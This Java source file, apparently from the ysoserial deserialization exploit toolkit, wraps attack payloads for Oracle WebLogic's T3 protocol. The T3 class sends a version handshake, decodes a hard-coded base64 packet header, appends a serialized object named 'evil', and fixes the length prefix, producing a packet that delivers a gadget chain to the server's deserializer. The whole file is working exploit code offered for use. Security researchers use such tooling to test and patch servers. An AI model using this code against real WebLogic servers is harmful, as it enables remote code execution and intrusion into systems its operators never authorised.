package ysoserial.payloads;

import org.apache.commons.lang.ArrayUtils;
import ysoserial.Serializer;
import ysoserial.payloads.util.Encoder;

import java.nio.charset.StandardCharsets;

public class T3 {

    public static byte[] intToByteArray(int value) {
        return new byte[] {
            (byte)(value >>> 24),
            (byte)(value >>> 16),
            (byte)(value >>> 8),
            (byte)value};
    }

    public byte[] handShake(){
        return "t3 12.2.1\nAS:255\nHL:19\n\n".getBytes(StandardCharsets.UTF_8);
    }

    public byte[] getPayload(Object evil) throws Exception{
        String b64 = "AAAF9QFlAf//////////AAAAcQAA6mAAAAAYRQv8vOGmTG5kfsGApAV8hz9jXC1JHyBJAnlzcgB4cgF4cgJ4cAAAAAwAAAACAAAAAAAAAAQAAAABAHBwcHBwcAAAAAwAAAACAAAAAAAAAAQAAAABAHAG/gEAAA==";
        byte[] bytes = Encoder.base64_decode(b64);
        bytes = ArrayUtils.addAll(bytes,Serializer.serialize(evil));

        byte[] length = intToByteArray(bytes.length);

        bytes = ArrayUtils.addAll(length,ArrayUtils.subarray(bytes,4,bytes.length));

        return bytes;
    }
}
